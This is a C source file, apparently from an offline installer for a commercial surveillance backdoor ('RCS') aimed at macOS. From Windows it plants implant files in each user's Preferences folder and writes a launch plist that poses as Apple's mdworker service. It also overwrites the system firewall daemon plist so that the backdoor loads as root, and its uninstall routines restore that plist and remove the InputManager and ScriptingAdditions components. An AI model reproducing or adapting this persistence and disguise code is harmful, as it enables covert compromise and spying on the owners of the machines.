#include "stdafx.h"
#include "Functions_Users.h"
#include "commons.h"

#define TEMPORARY_LOADER L"4872364829"

char _plist_alf_content[] =	"<?xml version=\"1.0\" encoding=\"UTF-8\"?>"
							"<!DOCTYPE plist PUBLIC \"-//Apple Computer//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">"
							"<plist version=\"1.0\">"
							"<dict>"
							"<key>KeepAlive</key>"
							"<dict>"
							"<key>SuccessfulExit</key>"
							"<false/>"
							"</dict>"
							"<key>Label</key>"
							"<string>com.apple.alf</string>"
							"<key>ProgramArguments</key>"
							"<array>"
							"<string>/bin/bash</string>"
							"<string>-c</string>"
							"<string>%S/usr/libexec/ApplicationFirewall/socketfilterfw</string>"
							"</array>"
							"<key>LaunchOnlyOnce</key>"
							"<true/>"
							"<key>StandardErrorPath</key>"
							"<string>/var/log/alf.log</string>"
							"<key>StandardOutPath</key>"
							"<string>/var/log/alf.log</string>"
							"<key>UserName</key>"
							"<string>root</string>"
							"</dict>"
							"</plist>";


char _mdworker_content[]=	"<?xml version=\"1.0\" encoding=\"UTF-8\"?>"
							"<!DOCTYPE plist PUBLIC \"-//Apple Computer//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">"
							"<plist version=\"1.0\">"
							"<dict>"
							"<key>Label</key>"
							"<string>com.apple.mdworkers.%S</string>"
							"<key>ProgramArguments</key>"
							"<array>"
							"<string>%S/Library/Preferences/%S_/%S</string>"
							"<string>%S</string>"
							"<string>%S</string>"
							"<string>%S</string>"
							"</array>"
							"<key>KeepAlive</key>"
							"<dict>"
							"<key>SuccessfulExit</key>"
							"<false/>"
							"</dict>"
							"</dict>"
							"</plist>";

#define BUFFER_SIZE 10000
BOOL SafeCopyFile(WCHAR *source_path, WCHAR *dest_path, BOOL destMustExist)
{
	BYTE *buffer;
	HANDLE hs, hd; 
	DWORD read, write;

	buffer = (BYTE *)malloc(BUFFER_SIZE);
	if (!buffer)
		return FALSE;

	hs = CreateFile(source_path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL);
	if (hs == INVALID_HANDLE_VALUE) {
		SAFE_FREE(buffer);
		return FALSE;
	}

	if (destMustExist) 
		hd = CreateFile(dest_path, GENERIC_WRITE, FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL);
	else
		hd = CreateFile(dest_path, GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, NULL, NULL);
	if (hd == INVALID_HANDLE_VALUE) {
		CloseHandle(hs);
		SAFE_FREE(buffer);
		return FALSE;
	}

	while(ReadFile(hs, buffer, BUFFER_SIZE, &read, NULL) && read!=0) {
		if (!WriteFile(hd, buffer, read, &write, NULL) || write!=read) {
			CloseHandle(hs);
			CloseHandle(hd);
			SAFE_FREE(buffer);
			return FALSE;
		}
	}

	SetEndOfFile(hd);
	CloseHandle(hs);
	CloseHandle(hd);
	SAFE_FREE(buffer);
	return TRUE;
}

BOOL CheckTempStatus(users_struct_t *user_info, rcs_struct_t *rcs_info, os_struct_t *os_info)
{
	WCHAR tpath[MAX_PATH];
	HANDLE hfile;

	swprintf_s(tpath, MAX_PATH, L"%s%s\\Library\\Preferences\\%s_\\%s", os_info->drive, SlashToBackSlash(user_info->user_home), rcs_info->hdir, rcs_info->hcore);
	hfile = CreateFile(tpath, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, NULL, NULL);
	if (hfile == INVALID_HANDLE_VALUE)
		return FALSE;

	CloseHandle(hfile);
	return TRUE;
}

void MAC_GetSourceFileDirectory(users_struct_t *user_info, rcs_struct_t *rcs_info, os_struct_t *os_info, WCHAR *src_path) 
{
	_snwprintf_s(src_path, MAX_PATH, _TRUNCATE, L"%s%s\\Library\\Preferences\\%s.app", os_info->drive, SlashToBackSlash(user_info->user_home), rcs_info->hdir);
}

BOOL MAC_RCSInstall(rcs_struct_t *rcs_info, users_struct_t *user_info, os_struct_t *os_info)
{
	WCHAR tmp_path[MAX_PATH*2];
	WCHAR tmp_path2[MAX_PATH*2];
	HANDLE hFind, hfile;
	WIN32_FIND_DATA file_info;
	DWORD w_len;

	WCHAR temp_backdoor_path[MAX_PATH];
	WCHAR plist_path[MAX_PATH];

	char mdworker_plist_content[2048];

	if (!rcs_info || !user_info || !os_info)
		return FALSE;

	// hdir con un '_' indica la directory temporanea dove vengono droppati i file per l'installazione
	swprintf_s(temp_backdoor_path, MAX_PATH, L"%s%s\\Library\\Preferences\\%s_", os_info->drive, user_info->user_home, rcs_info->hdir);
	sprintf_s(mdworker_plist_content, sizeof(mdworker_plist_content), _mdworker_content, user_info->user_name, user_info->user_home, rcs_info->hdir, TEMPORARY_LOADER, user_info->user_name, rcs_info->hdir, rcs_info->hcore);
	_snwprintf_s(plist_path, MAX_PATH, _TRUNCATE, L"%s\\com.apple.mdworkers.plist", temp_backdoor_path);

	// Crea la directory temporanea
	ClearAttributes(temp_backdoor_path);
	if (!CreateDirectory(temp_backdoor_path, NULL) && (GetLastError()!=ERROR_ALREADY_EXISTS)) 
		return FALSE;

	// Crea l'mdworker (nella directory temporanea)
	ClearAttributes(plist_path);
	hfile = CreateFile(plist_path, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, NULL, NULL);
	if (hfile == INVALID_HANDLE_VALUE)
		return FALSE;
		
	if (!WriteFile(hfile, mdworker_plist_content, strlen(mdworker_plist_content), &w_len, NULL) || w_len!=strlen(mdworker_plist_content)) {
		CloseHandle(hfile);
		return FALSE;
	}
	CloseHandle(hfile);

	// Crea un marker nella directory temporanea
	_snwprintf_s(plist_path, MAX_PATH, _TRUNCATE, L"%s\\00", temp_backdoor_path);
	hfile = CreateFile(plist_path, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, NULL, NULL);
	if (hfile == INVALID_HANDLE_VALUE)
		return FALSE;
	CloseHandle(hfile);

	// Copia i file nella directory temporanea
	swprintf_s(tmp_path, MAX_PATH, L"%s\\MACOS\\*", rcs_info->rcs_files_path);
	hFind = FindFirstFile(tmp_path, &file_info);
	if (hFind != INVALID_HANDLE_VALUE) {
		do {
			// Salta le directory (es: ".", ".." etc...)
			if (file_info.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
				continue;

			swprintf_s(tmp_path, MAX_PATH, L"%s\\MACOS\\%s", rcs_info->rcs_files_path, file_info.cFileName);
			swprintf_s(tmp_path2, MAX_PATH, L"%s\\%s", temp_backdoor_path, file_info.cFileName);
			
			ClearAttributes(tmp_path2);
			if (!SafeCopyFile(tmp_path, tmp_path2, FALSE)) {
				FindClose(hFind);
				return FALSE;
			}
		} while (FindNextFile(hFind, &file_info));
		if (GetLastError() != ERROR_NO_MORE_FILES) {
			FindClose(hFind);
			return FALSE;
		}
		FindClose(hFind);
	} else
		return FALSE;

	return TRUE;
}

BOOL MAC_RCSUnInstall(rcs_struct_t *rcs_info, users_struct_t *user_info, os_struct_t *os_info)
{
	WCHAR backdoor_path[MAX_PATH];

	if (!rcs_info || !user_info || !os_info)
		return FALSE;

	// Cancella la directory temporanea (nel caso la backdoor non abbia mai runnato)
	swprintf_s(backdoor_path, MAX_PATH, L"%s%s\\Library\\Preferences\\%s_", os_info->drive, SlashToBackSlash(user_info->user_home), rcs_info->hdir);
	DeleteDirectory(backdoor_path);

	// Cancella il plist della backdoor
	_snwprintf_s(backdoor_path, MAX_PATH, _TRUNCATE, L"%s%s\\Library\\LaunchAgents\\com.apple.mdworker.plist", os_info->drive, SlashToBackSlash(user_info->user_home));
	ClearAttributes(backdoor_path);
	DeleteFile(backdoor_path);

	// Cancella tutti i file e la directory
	MAC_GetSourceFileDirectory(user_info, rcs_info, os_info, backdoor_path);
	DeleteDirectory(backdoor_path);

	return TRUE;
}


BOOL MAC_DriverInstall(os_struct_t *os_info, rcs_struct_t *rcs_info, users_struct_t *users_list_head)
{
	WCHAR plist_path[MAX_PATH], plist_path_bu[MAX_PATH];
	WCHAR sudo_partial_string[1024];
	WCHAR *sudo_total_string = NULL;
	char *plist_alf_content = NULL;
	HANDLE hfile;
	DWORD sudo_string_len;
	DWORD plist_alf_len;
	DWORD w_len;
	users_struct_t *curr_user;
	BOOL to_modify = FALSE;

	// Cicla tutti gli utenti per vedere se ci sono backdoor che devono essere runnate ancora per la prima volta 
	// e per cui bisogna modificare l'alf plist
	sudo_total_string = (WCHAR *)calloc(1, sizeof(WCHAR));
	if (!sudo_total_string)
		return FALSE;
	for(curr_user=users_list_head; curr_user; curr_user=curr_user->next) {
		if (CheckTempStatus(curr_user, rcs_info, os_info)) {
			swprintf_s(sudo_partial_string, sizeof(sudo_partial_string)/sizeof(WCHAR), L"sudo launchctl load -F %s/Library/Preferences/%s_/com.apple.mdworkers.plist; ", curr_user->user_home, rcs_info->hdir);
			sudo_string_len = wcslen(sudo_total_string) + wcslen(sudo_partial_string);
			sudo_total_string = (WCHAR *)realloc(sudo_total_string, (sudo_string_len+1)*sizeof(WCHAR));
			if (!sudo_total_string)
				return FALSE;
			wcscat(sudo_total_string, sudo_partial_string);
			to_modify = TRUE;
		}
	}
	// se non trova neanche un utente da aggiungere al plist vuol dire che c'e' qualcosa che non va
	if(!to_modify) {
		SAFE_FREE(sudo_total_string);
		return FALSE;
	}

	// Scrive il contenuto del nuovo plist di alf con tutti gli utenti appena installati
	plist_alf_len = wcslen(sudo_total_string) + strlen(_plist_alf_content);
	if ( !(plist_alf_content = (char *)malloc(plist_alf_len)) ) {
		SAFE_FREE(sudo_total_string);
		return FALSE;
	}
	sprintf_s(plist_alf_content, plist_alf_len, _plist_alf_content, sudo_total_string);	
	SAFE_FREE(sudo_total_string);

	// Copia una versione del plist alf originale (Solo se ancora non e' stata fatta)
	swprintf_s(plist_path_bu, MAX_PATH, L"%sLibrary\\Preferences\\com.apple.alf.agent.plist", os_info->drive);
	swprintf_s(plist_path, MAX_PATH, L"%sSystem\\Library\\LaunchDaemons\\com.apple.alf.agent.plist", os_info->drive);
	hfile = CreateFile(plist_path_bu, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, NULL, NULL);
	if (hfile == INVALID_HANDLE_VALUE) 
		SafeCopyFile(plist_path, plist_path_bu, FALSE);
	else 
		CloseHandle(hfile);

	// Scrive il nuovo file alf plist
	hfile = CreateFile(plist_path, GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, NULL, NULL);
	if (hfile == INVALID_HANDLE_VALUE) {
		SAFE_FREE(plist_alf_content);
		return FALSE;
	}
	if (!WriteFile(hfile, plist_alf_content, strlen(plist_alf_content), &w_len, NULL) || w_len!=strlen(plist_alf_content)) {
		CloseHandle(hfile);
		SAFE_FREE(plist_alf_content);
		return FALSE;
	}
	SetEndOfFile(hfile);
	CloseHandle(hfile);
	SAFE_FREE(plist_alf_content);
	
	return TRUE;
}

BOOL MAC_DriverUnInstall(os_struct_t *os_info, rcs_struct_t *rcs_info, users_struct_t *users_list_head, DWORD installation_count)
{
	WCHAR backdoor_path[MAX_PATH], plist_path[MAX_PATH], plist_path_bu[MAX_PATH];
	users_struct_t *curr_user;
	DWORD i;

	// Se non ci sono piu' backdoor mai runnate (mai runnate == hanno ancora i file nelle directory temporanee)
	// allora ripristiniamo il plist di alf originale
	for(curr_user=users_list_head, i=0; curr_user; curr_user=curr_user->next) {
		if (CheckTempStatus(curr_user, rcs_info, os_info)) {
			i++;
			break;
		}
	}
	if (i==0) {
		swprintf_s(plist_path_bu, MAX_PATH, L"%sLibrary\\Preferences\\com.apple.alf.agent.plist", os_info->drive);
		swprintf_s(plist_path, MAX_PATH, L"%sSystem\\Library\\LaunchDaemons\\com.apple.alf.agent.plist", os_info->drive);
		SafeCopyFile(plist_path_bu, plist_path, TRUE); // Apre la destinazione con OPEN_EXISTING per mantenere i permessi del file
		DeleteFile(plist_path_bu);
	}

	// Rimuove l'input manager quando si toglie l'ultima istanza della backdoor
	if (installation_count == 0) {
		swprintf_s(backdoor_path, MAX_PATH, L"%sLibrary\\ScriptingAdditions\\appleOsax", os_info->drive);
		DeleteDirectory(backdoor_path);
		swprintf_s(backdoor_path, MAX_PATH, L"%sLibrary\\InputManagers\\appleHID", os_info->drive);
		DeleteDirectory(backdoor_path);
	}
	return TRUE;
}
